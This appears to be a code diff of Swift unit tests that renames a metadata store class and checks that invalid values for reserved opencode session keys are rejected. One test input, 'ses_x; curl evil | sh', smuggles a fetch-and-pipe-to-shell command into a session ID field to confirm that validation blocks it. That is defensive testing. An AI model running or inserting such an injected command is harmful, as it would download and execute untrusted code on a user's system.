@@ -72,7 +72,7 @@ final class OpencodeSessionIdGrammarTests: XCTestCase {
 
 final class OpencodeReservedKeyValidationTests: XCTestCase {
 
-    private let store = TabMetadataStore.shared
+    private let store = PanelMetadataStore.shared
     private let validId = "ses_0fda89a49ffeLHwJXtrxnn4X6g"
 
     func testStoreAcceptsValidSessionId() throws {
@@ -117,7 +117,7 @@ final class OpencodeReservedKeyValidationTests: XCTestCase {
             partial: ["opencode.session_id": "ses_x; curl evil | sh"],
             mode: .merge, source: .explicit
         )) { error in
-            guard let e = error as? TabMetadataStore.WriteError else {
+            guard let e = error as? PanelMetadataStore.WriteError else {
                 return XCTFail("expected WriteError, got \(error)")
             }
             XCTAssertEqual(e.code, "reserved_key_invalid_type")
@@ -132,7 +132,7 @@ final class OpencodeReservedKeyValidationTests: XCTestCase {
             partial: ["opencode.session_id": 42],
             mode: .merge, source: .explicit
         )) { error in
-            guard let e = error as? TabMetadataStore.WriteError else {
+            guard let e = error as? PanelMetadataStore.WriteError else {
                 return XCTFail("expected WriteError, got \(error)")
             }
             XCTAssertEqual(e.code, "reserved_key_invalid_type")
@@ -147,7 +147,7 @@ final class OpencodeReservedKeyValidationTests: XCTestCase {
             partial: ["opencode.session_project_dir": "not/absolute"],
             mode: .merge, source: .explicit
         )) { error in
-            guard let e = error as? TabMetadataStore.WriteError else {
+            guard let e = error as? PanelMetadataStore.WriteError else {
                 return XCTFail("expected WriteError, got \(error)")
             }
             XCTAssertEqual(e.code, "reserved_key_invalid_type")
